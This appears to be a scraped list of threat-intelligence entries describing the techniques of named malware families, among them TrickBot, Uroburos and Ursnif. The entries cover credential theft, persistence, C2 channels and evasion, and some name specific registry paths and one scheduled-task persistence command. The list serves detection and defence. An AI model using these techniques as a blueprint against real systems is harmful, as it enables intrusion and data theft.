TajMahal has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.
TajMahal has the ability to capture VoiceIP application audio on an infected host.
TajMahal has the ability to index and compress files into a send queue for exfiltration.
TajMahal has the ability to manage an automated queue of egress files and commands sent to its C2.
TajMahal has the ability to steal data from the clipboard of an infected host.
TajMahal has the ability to steal documents from the local system including the print spooler queue.
TajMahal has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.
TajMahal has the ability to inject DLLs for malicious plugins into running processes.
TajMahal has the ability to send collected files over its C2.
TajMahal has the ability to index files from drives, user profiles, and removable drives.
TajMahal has the ability to capture keystrokes on an infected host.
TajMahal can set the &lt;code&gt;KeepPrintedJobs&lt;/code&gt; attribute for configured printers in &lt;code&gt;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers&lt;/code&gt; to enable document stealing.
TajMahal has used an encrypted Virtual File System to store plugins.
TajMahal has the ability to identify connected Apple devices.
TajMahal has the ability to identify running processes and associated plugins on an infected host.
TajMahal has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.
TajMahal has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.
TajMahal has the ability to inject the &lt;code&gt;LoadLibrary&lt;/code&gt; call template DLL into running processes.
TajMahal has the ability to identify the Internet Explorer (IE) version on an infected host.
TajMahal has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.
TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host.
TajMahal has the ability to identify the MAC address on an infected host.
TajMahal has the ability to determine local time on a compromised host.
TajMahal has the ability to capture webcam video.
Tarrask is able to create “hidden” scheduled tasks by deleting the Security Descriptor (`SD`) registry value.
Tarrask creates a scheduled task called “WinUpdate” to re-establish any dropped  C2 connections.
Tarrask has masqueraded as executable files such as `winupdate.exe`, `date.exe`, or `win.exe`.
Tarrask is able to delete the Security Descriptor (`SD`) registry subkey in order to “hide” scheduled tasks.
Tarrask is able to create “hidden” scheduled tasks for persistence.
Tarrask leverages token theft to obtain `lsass.exe` security permissions.
Tarrask may abuse the Windows schtasks command-line tool to create "hidden" scheduled tasks.
Tasklist can be used to discover processes running on a system.
Tasklist can be used to enumerate security software currently running on a system by process name of known products.
Tasklist can be used to discover services running on a system.
ThiefQuest uses AppleScript's &lt;code&gt;osascript -e&lt;/code&gt; command to launch ThiefQuest's persistence via Launch Agent and Launch Daemon.
ThiefQuest searches through the &lt;code&gt;/Users/&lt;/code&gt; folder looking for executable files. For each executable, ThiefQuest prepends a copy of itself to the beginning of the file. When the file is executed, the ThiefQuest code is executed first. ThiefQuest creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior.
ThiefQuest encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.
ThiefQuest uses a function named &lt;code&gt;is_debugging&lt;/code&gt; to perform anti-debugging logic. The function invokes &lt;code&gt;sysctl&lt;/code&gt; checking the returned value of &lt;code&gt;P_TRACED&lt;/code&gt;. ThiefQuest also calls &lt;code&gt;ptrace&lt;/code&gt; with the &lt;code&gt;PTRACE_DENY_ATTACH&lt;/code&gt; flag to prevent debugging.
ThiefQuest uses the function &lt;code&gt;kill_unwanted&lt;/code&gt; to obtain a list of running processes and kills each process matching a list of security related processes.
ThiefQuest exfiltrates targeted file extensions in the &lt;code&gt;/Users/&lt;/code&gt; folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.
ThiefQuest hides a copy of itself in the user's &lt;code&gt;~/Library&lt;/code&gt; directory by using a &lt;code&gt;.&lt;/code&gt; at the beginning of the file name followed by 9 random characters.
ThiefQuest can download and execute payloads in-memory or from disk.
ThiefQuest uses the &lt;code&gt;CGEventTap&lt;/code&gt; functions to perform keylogging.
ThiefQuest installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the &lt;code&gt;~/Library/LaunchAgents/&lt;/code&gt; folder and configured with the path to the persistent binary located in the &lt;code&gt;~/Library/&lt;/code&gt; folder.
When running with root privileges after a Launch Agent is installed, ThiefQuest installs a plist file to the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder with the &lt;code&gt;RunAtLoad&lt;/code&gt; key set to &lt;code&gt;true&lt;/code&gt; establishing persistence as a Launch Daemon.
ThiefQuest prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.
ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.
ThiefQuest obtains a list of running processes using the function &lt;code&gt;kill_unwanted&lt;/code&gt;.
ThiefQuest uses various API functions such as &lt;code&gt;NSCreateObjectFileImageFromMemory&lt;/code&gt; to load and link in-memory payloads.
ThiefQuest uses the &lt;code&gt;kill_unwanted&lt;/code&gt; function to get a list of running processes, compares each process with an encrypted list of “unwanted” security related programs, and kills the processes for security related programs.
ThiefQuest invokes &lt;code&gt;time&lt;/code&gt; call to check the system's time, executes a &lt;code&gt;sleep&lt;/code&gt; command, invokes a second &lt;code&gt;time&lt;/code&gt; call, and then compares the time difference between the two &lt;code&gt;time&lt;/code&gt; calls and the amount of time the system slept to identify the sandbox.
ThiefQuest uploads files via unencrypted HTTP.
ThreatNeedle can collect data and files from a compromised host.
ThreatNeedle can decrypt its payload using RC4, AES, or one-byte XORing.
ThreatNeedle has been compressed and obfuscated using RC4, AES, or XOR.
ThreatNeedle can obtain file and directory information.
ThreatNeedle can save its configuration data as a RC4-encrypted Registry key under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon`.
ThreatNeedle can download additional tools to enable lateral movement.
ThreatNeedle relies on a victim to click on a malicious document for initial execution.
ThreatNeedle chooses its payload creation path from a randomly selected service name from netsvc.
ThreatNeedle can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon`.
ThreatNeedle can be loaded into the Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrives.lnk`) as a Shortcut file for persistence.
ThreatNeedle has been distributed via a malicious Word document within a spearphishing email.
ThreatNeedle can collect system profile information from a compromised host.
ThreatNeedle can run in memory and register its payload as a Windows service.
TinyTurla has the ability to encrypt C2 traffic with SSL/TLS.
TinyTurla can upload files from a compromised host.
TinyTurla can go through a list of C2 server IPs and will try to register with each until one responds.
TinyTurla can save its configuration parameters in the Registry.
TinyTurla has the ability to act as a second-stage dropper used to infect the system with additional malware.
TinyTurla has mimicked an existing Windows service by being installed as &lt;code&gt;Windows Time Service&lt;/code&gt;.
TinyTurla has been deployed as `w64time.dll` to appear legitimate.
TinyTurla can set its configuration parameters in the Registry.
TinyTurla has used `WinHTTP`, `CreateProcess`, and other APIs for C2 communications and other functions.
TinyTurla can query the Registry for its configuration information.
TinyTurla contacts its C2 based on a scheduled timing set in its configuration.
TinyTurla can install itself as a service on compromised machines.
TinyTurla can use HTTPS in C2 communications.
TinyTurla has been installed using a .bat file.
TinyZBot contains functionality to collect information from the clipboard.
TinyZBot can disable Avira anti-virus.
TinyZBot contains keylogger functionality.
TinyZBot can create a shortcut in the Windows startup folder for persistence.
TinyZBot contains screen capture functionality.
TinyZBot can create a shortcut in the Windows startup folder for persistence.
TinyZBot supports execution from the command-line.
TinyZBot can install as a Windows service for persistence.
Tomiris has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.
Tomiris has connected to a signalization server that provides a URL and port, and then Tomiris sends a GET request to that URL to establish C2.
Tomiris can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.
Tomiris can download files and execute them on a victim's system.
Tomiris has used `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR "[path to self]" /ST 10:00` to establish persistence.
Tomiris has been packed with UPX.
Tomiris has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.
Tomiris can use HTTP to establish C2 communications.
Tor encapsulates traffic in multiple layers of encryption, using TLS by default.
Traffic traversing the Tor network will be forwarded to multiple nodes before exiting the Tor network and continuing on to its intended destination.
Torisma has used XOR and Base64 to decode C2 data.
Torisma has been Base64 encoded and AES encrypted.
Torisma is only delivered to a compromised host if the victim's IP address is on an allow-list.
Torisma can send victim data to an actor-controlled C2 server.
Torisma has used various Windows API calls.
Torisma has been packed with Iz4 compression.
Torisma has encoded C2 communications with Base64.
Torisma has encrypted its C2 communications using XOR and VEST-32.
Torisma can use `GetlogicalDrives` to get a bitmask of all drives available on a compromised system. It can also use `GetDriveType` to determine if a new drive is a CD-ROM drive.
Torisma can collect the local MAC address using `GetAdaptersInfo` as well as the system's IP address.
Torisma can use `WTSEnumerateSessionsW` to monitor remote desktop connections.
Torisma can collect the current time on a victim machine.
Torisma can use HTTP and HTTPS for C2 communications.
TrailBlazer can masquerade its C2 traffic as legitimate Google Notifications HTTP requests.
TrailBlazer has used random identifier strings to obscure its C2 operations and result codes.
TrailBlazer has used filenames that match the name of the compromised system in attempt to avoid detection.
TrailBlazer has used HTTP requests for C2.
TrailBlazer has the ability to use WMI for persistence.
TrickBot can implant malicious code into a compromised device's firmware.
TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.
TrickBot has come with a signed downloader component.
TrickBot used COM to setup scheduled task for persistence.
TrickBot has the ability to capture RDP credentials by capturing the &lt;code&gt;CredEnumerateA&lt;/code&gt; API
TrickBot uses brute-force attack against RDP with rdpscanDll module.
TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the ".vnc.lnk" affix to steal VNC credentials.
TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.
TrickBot has retrieved PuTTY credentials by querying the &lt;code&gt;Software\SimonTatham\Putty\Sessions&lt;/code&gt; registry key
TrickBot collects local files and information from the victim’s local machine.
TrickBot decodes the configuration data and modules.
TrickBot can disable Windows Defender.
TrickBot can gather information about domain trusts by utilizing Nltest.
TrickBot collects email addresses from Outlook.
TrickBot uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.
TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.
TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.
TrickBot has been known to reach a command and control server via one of nine proxy IP addresses.
TrickBot can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.
TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.
TrickBot module "Trickboot" can write or erase the UEFI/BIOS firmware of a compromised device.
TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.
TrickBot downloads several additional files and saves them to the victim's machine.
TrickBot collects the users of the system.
TrickBot has attempted to get users to launch malicious documents to deliver its payload.
The TrickBot downloader has used an icon to appear as a Microsoft Word document.
TrickBot can modify registry entries.
TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow. TrickBot has also used &lt;code&gt;Nt*&lt;/code&gt; API functions to perform Process Injection.
TrickBot module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.
Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. Newer versions of TrickBot have been known to use a custom communication protocol which sends the data unencrypted over port 443.
TrickBot uses non-descriptive names to hide functionality.
TrickBot can steal passwords from the KeePass open source password manager.
TrickBot can identify the groups the user on a compromised host belongs to.
TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.
TrickBot uses module networkDll for process list discovery.
TrickBot injects into the svchost.exe process.
TrickBot has used &lt;code&gt;Nt*&lt;/code&gt; Native API functions to inject code into legitimate processes such as &lt;code&gt;wermgr.exe&lt;/code&gt;.
TrickBot establishes persistence in the Startup folder.
TrickBot uses vncDll module to remote control the victim machine.
TrickBot can enumerate computers and network devices.
TrickBot creates a scheduled task on the system that provides persistence.
TrickBot leverages a custom packer to obfuscate its functionality.
TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware
TrickBot has been delivered via malicious links in phishing e-mails.
TrickBot can Base64-encode C2 commands.
TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.Newer versions of TrickBot have been known to use `bcrypt` to encrypt and digitally sign responses to their C2 server.
TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.
TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.
TrickBot can identify the user and groups the user belongs to on a compromised host.
TrickBot collects a list of install programs and services on the system’s machine.
TrickBot has used &lt;code&gt;printf&lt;/code&gt; and file I/O loops to delay process execution as part of API hammering.
TrickBot has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network
TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.
TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine.
TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
Trojan.Karagany can monitor the titles of open windows to identify specific keywords.
Trojan.Karagany can secure C2 communications with SSL and TLS.
Trojan.Karagany can steal data and credentials from browsers.
Trojan.Karagany has used plugins with a self-delete capability.
Trojan.Karagany can enumerate files and directories on a compromised host.
Trojan.Karagany can upload, download, and execute files on the victim.
Trojan.Karagany can capture keystrokes on a compromised host.
Trojan.Karagany can create directories to store plugin output and stage data for exfiltration.
Trojan.Karagany can dump passwords and save them into &lt;code&gt;\ProgramData\Mail\MailAg\pwds.txt&lt;/code&gt;.
Trojan.Karagany can base64 encode and AES-128-CBC encrypt data prior to transmission.
Trojan.Karagany can use Tasklist to collect a list of running tasks.
Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart.
Trojan.Karagany can take a desktop screenshot and save the file into &lt;code&gt;\ProgramData\Mail\MailAg\shot.png&lt;/code&gt;.
Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.
Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.
Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration.
Trojan.Karagany can gather information on the network configuration of a compromised host.
Trojan.Karagany can use netstat to collect a list of network connections.
Trojan.Karagany can gather information about the user on a compromised host.
Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the &lt;code&gt;ResumeThread&lt;/code&gt; API.
Trojan.Karagany can communicate with C2 via HTTP POST requests.
Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.
Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal.
To establish persistence, Truvasys adds a Registry Run key with a value "TaskMgr" in an attempt to masquerade as the legitimate Windows Task Manager.
Truvasys adds a Registry Run key to establish persistence.
Turian can use WinRAR to create a password-protected archive for files of interest.
Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.
Turian can search for specific files and list directories.
Turian can download additional files and tools from its C2.
Turian can insert pseudo-random characters into its network encryption setup.
Turian can store copied files in a specific directory prior to exfiltration.
Turian can disguise as a legitimate service to blend into normal operations.
Turian can use VMProtect for obfuscation.
Turian can scan for removable media to collect data.
Turian has the ability to use Python to spawn a Unix shell.
Turian can establish persistence by adding Registry Run keys.
Turian has the ability to take screenshots.
Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information.
Turian can retrieve the internal IP address of a compromised host.
Turian can retrieve usernames.
Turian has the ability to use &lt;code&gt;/bin/sh&lt;/code&gt; to execute commands.
Turian has the ability to use HTTP for its C2.
Turian can create a remote shell and execute commands using cmd.
UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.
UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.
UBoatRAT has used GitHub and a public blog service in Hong Kong for C2 communications.
UBoatRAT can upload and download files to the victim’s machine.
UBoatRAT can list running processes on the system.
UBoatRAT encrypts instructions in its C2 network payloads using a simple XOR cipher.
UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.
UBoatRAT has used HTTP for C2 communications.
UBoatRAT can start a command shell.
UPPERCUT has the capability to gather the victim's current directory.
UPPERCUT can download and upload files to and from the victim’s machine.
UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server.
Some versions of UPPERCUT have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.
UPPERCUT has the capability to gather the system’s hostname and OS version.
UPPERCUT has the capability to gather the victim's proxy information.
UPPERCUT has the capability to collect the current logged on user’s username from a machine.
UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim’s machine.
UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers.
UPPERCUT uses cmd.exe to execute commands on the victim’s machine.
For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration.
USBStealer automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine.
USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.
Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim.
Most strings in USBStealer are encrypted using 3DES and XOR and reversed.
USBStealer exfiltrates collected files via removable media from air-gapped victims.
USBStealer has several commands to delete files associated with the malware from the victim.
USBStealer searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.
USBStealer collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.
USBStealer mimics a legitimate Russian program called USB Disk Security.
USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.
USBStealer registers itself under a Registry Run key with the name "USB Disk Security."
USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.
USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.
USBferry can collect information from an air-gapped host machine.
USBferry can detect the victim's file or folder list.
USBferry can use &lt;code&gt;net user&lt;/code&gt; to gather information about local accounts.
USBferry can check for connected USB devices.
USBferry can use &lt;code&gt;tasklist&lt;/code&gt; to gather information about the process running on the infected system.
USBferry can use &lt;code&gt;net view&lt;/code&gt; to gather information about remote systems.
USBferry can copy its installer to attached USB storage devices.
USBferry can execute rundll32.exe in memory to avoid detection.
USBferry can detect the infected machine's network topology using &lt;code&gt;ipconfig&lt;/code&gt; and &lt;code&gt;arp&lt;/code&gt;.
USBferry can use &lt;code&gt;netstat&lt;/code&gt; and &lt;code&gt;nbtstat&lt;/code&gt; to detect active network connections.
USBferry can execute various Windows commands.
Umbreon creates valid local users to provide access to the system.
Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate.
Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.
Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.
Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet
Unknown Logger is capable of stealing usernames and passwords from browsers on the victim machine.
Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.
Unknown Logger is capable of downloading remote files.
Unknown Logger is capable of recording keystrokes.
Unknown Logger is capable of spreading to USB devices.
Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.
Unknown Logger can obtain information about the victim's IP address.
Unknown Logger can obtain information about the victim usernames.
Uroburos has used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications.
Uroburos has encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted by Uroburos is contained in the part of the character string prior to the first ‘.’ character.
Uroburos can use its `Get` command to exfiltrate specified files from the compromised system.
Uroburos can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.
Uroburos can use DLL injection to load embedded files and modules.
The Uroburos Queue file contains embedded executable files along with key material, communication channels, and modes of operation.
Uroburos can use AES and CAST-128 encryption to obfuscate resources.
Uroburos can use up to 10 channels to communicate between implants.
Uroburos can run a `Clear Agents Track` command on an infected machine to delete Uroburos-related logs.
Uroburos can search for specific files on a compromised system.
Uroburos can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds.`
Uroburos can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.
Uroburos can use a `Put` command to write files to an infected machine.
Uroburos has the ability to move data between its kernel and user mode components, generally using named pipes.
Uroburos can add extra characters in encoded strings to help mimic DNS legitimate requests.
Uroburos can use custom communications protocols that ride over SMTP.
Uroburos has registered a service named `WerFaultSvc`, likely to spoof the legitimate Windows error reporting service.
Uroburos can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other Uroburos components.
Individual Uroburos implants can use multiple communication channels based on one of four available modes of operation.
Uroburos can use implants on multiple compromised machines to proxy communications through its worldwide P2P network.
Uroburos can use native Windows APIs including `GetHostByName`.
Uroburos can communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols.
Uroburos can use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications.
Uroburos can use its `Process List` command to enumerate processes on compromised hosts.
Uroburos can use custom communication methodologies that ride over common  protocols including TCP, UDP, HTTP, SMTP, and DNS in order to blend with normal network traffic.
Uroburos has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS.
Uroburos can query the Registry, typically `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds`, to find the key and path to decrypt and load its kernel driver and kernel driver loader.
Uroburos has the ability to load new modules directly into memory using its `Load Modules Mem` command.
Uroburos can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.
Uroburos uses a custom packer.
Uroburos can encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128, using a different key for incoming and outgoing data.
Uroburos has the ability to gather basic system information and run the POSIX API `gethostbyname`.
Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.
Uroburos can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP.
Uroburos has the ability to use the command line for execution on the targeted system.
Uroburos has registered a service, typically named `WerFaultSvc`, to decrypt and find a kernel driver and kernel driver loader to maintain persistence.
Ursnif has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).
Ursnif droppers execute base64 encoded PowerShell commands.
Ursnif droppers have used COM objects to execute the malware's full executable payload.
Ursnif has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.
Ursnif has used encoded data in HTTP URLs for C2.
Ursnif has collected files from victim machines, including certificates and cookies.
Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.
Ursnif has used a DGA to generate domain names for C2.
Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk. Ursnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.
Ursnif has used HTTP POSTs to exfil gathered information.
Ursnif has deleted data staged in tmp files after exfiltration.
Ursnif droppers have used COM properties to execute malware in hidden windows.
Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads.
Ursnif has used tmp files to stage gathered information.
Ursnif has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.
Ursnif has used Registry modifications as part of its installation routine.
Ursnif has used Tor for C2.
Ursnif has used &lt;code&gt;CreateProcessW&lt;/code&gt; to create child processes.
Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.
Ursnif has gathered information about running processes.
Ursnif has used process hollowing to inject into child processes.
Ursnif has used a peer-to-peer (P2P) network for C2.
Ursnif has used Reg to query the Registry for installed programs.
Ursnif has used Registry Run keys to establish automatic execution at system startup.
Ursnif has copied itself to and infected removable drives for propagation.
Ursnif has used hooked APIs to take screenshots.
Ursnif has used Systeminfo to gather system information.
Ursnif has gathered information about running services.
Ursnif has copied itself to and infected files in network drives for propagation.
Ursnif has injected code into target processes via thread local storage callbacks.
Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools.
Ursnif droppers have used VBA macros to download and execute the malware's full executable payload.
Ursnif has used HTTPS for C2.
Ursnif droppers have used WMI classes to execute PowerShell commands.
Ursnif has registered itself as a system service in the Registry for automatic execution at system startup.
VBShower has attempted to complicate forensic analysis by deleting all the files contained in &lt;code&gt;%APPDATA%\..\Local\Temporary Internet Files\Content.Word&lt;/code&gt; and &lt;code&gt;%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\&lt;/code&gt;.
VBShower has the ability to download VBS files to the target computer.
VBShower used &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\[a-f0-9A-F]{8}&lt;/code&gt; to maintain persistence.
VBShower has the ability to execute VBScript files.
VBShower has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.
VERMIN encrypts the collected files using 3-DES.
VERMIN can perform audio capture.
VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .
VERMIN collects data stored in the clipboard.
VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.
VERMIN is obfuscated using the obfuscation tool called ConfuserEx.
VERMIN can delete files on the victim’s machine.
VERMIN can download and upload files to the victim's machine.
VERMIN collects keystrokes from the victim machine.
VERMIN can get a list of the processes and running tasks on the system.
VERMIN can perform screen captures of the victim’s machine.
VERMIN uses WMI to check for anti-virus software installed on the system.
VERMIN is initially packed.
VERMIN collects the OS name, machine name, and architecture information.
VERMIN gathers the local IP address.
VERMIN gathers the username from the victim’s machine.
VERMIN uses HTTP for C2 communications.
Valak can download a module to search for and build a report of harvested credential data.
Valak can use the clientgrabber module to steal e-mail credentials from the Registry.
Valak has the ability to decode and decrypt downloaded files.
Valak has the ability to enumerate domain admin accounts.
Valak can execute tasks via OLE.
Valak has the ability to exfiltrate data over the C2 channel.
Valak can communicate over multiple C2 hosts.
Valak has the ability to store information regarding the C2 server and downloads in the Registry key &lt;code&gt;HKCU\Software\ApplicationContainer\Appsw64&lt;/code&gt;.
Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.
Valak can execute JavaScript containing configuration data for establishing persistence.
Valak has the ability to enumerate local admin accounts.
Valak has been executed via Microsoft Word documents containing malicious macros.
Valak has the ability to modify the Registry key &lt;code&gt;HKCU\Software\ApplicationContainer\Appsw64&lt;/code&gt; to store information regarding the C2 server and downloads.
Valak can download additional modules and malware capable of using separate C2 channels.
Valak has the ability save and execute files as alternate data streams (ADS).
Valak has the ability to base64 encode and XOR encrypt strings.
Valak has used PowerShell to download additional modules.
Valak has the ability to enumerate running processes on a compromised host.
Valak can use the Registry for code updates and to collect credentials.
Valak has used &lt;code&gt;regsvr32.exe&lt;/code&gt; to launch malicious DLLs.
Valak can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.
Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.
Valak has the ability to take screenshots on a compromised host.
Valak can determine if a compromised host has security products installed.
Valak has used packed DLL payloads.
Valak has been delivered via spearphishing e-mails with password protected ZIP files.
Valak has been delivered via malicious links in e-mail.
Valak has returned C2 data as encoded ASCII.
Valak can determine the Windows version and computer name on a compromised host.
Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine.
Valak can gather information regarding the user.
Valak has used HTTP in communications with C2.
Valak can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.
Valak can use &lt;code&gt;wmic process call create&lt;/code&gt; in a scheduled task to launch plugins and for execution.
VaporRage can deobfuscate XOR-encoded shellcode prior to execution.
VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found.
VaporRage has the ability to download malicious shellcode to compromised systems.
VaporRage can use HTTP to download shellcode from compromised websites.
Vasport can download files.
Vasport is capable of tunneling though a proxy.
Vasport copies itself to disk and creates an associated run key Registry entry to establish.
Vasport creates a backdoor by making a connection using a HTTP POST.
Some Volgmer variants use SSL to encrypt C2 communications.
Volgmer deobfuscates its strings and APIs once its executed.
A Volgmer variant is encoded using a simple XOR cipher.
Volgmer can delete files and itself after infection to avoid analysis.
Volgmer can list directories on a victim.
Volgmer stores an encoded configuration file in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security&lt;/code&gt;.
Volgmer can download remote files and additional payloads to the victim's machine.
Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.
Volgmer modifies the Registry to store an encoded configuration file in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security&lt;/code&gt;.
Volgmer executes payloads using the Windows API call CreateProcessW().
Volgmer can gather a list of processes.
Volgmer checks the system for certain Registry keys.
Volgmer uses a simple XOR cipher to encrypt traffic and files.
Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.
Volgmer can gather the IP address from the victim's machine.
Volgmer can gather information about TCP connection state.
Volgmer queries the system to identify existing services.
Volgmer can execute commands on the victim's machine.
Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings.
WARPWIRE can embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs.
WARPWIRE can send captured credentials to C2 via HTTP `GET` or `POST` requests.
WARPWIRE is a credential harvester written in JavaScript.
WARPWIRE can Base64 encode captured credentials with `btoa()` prior to sending to C2.
WARPWIRE can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP.
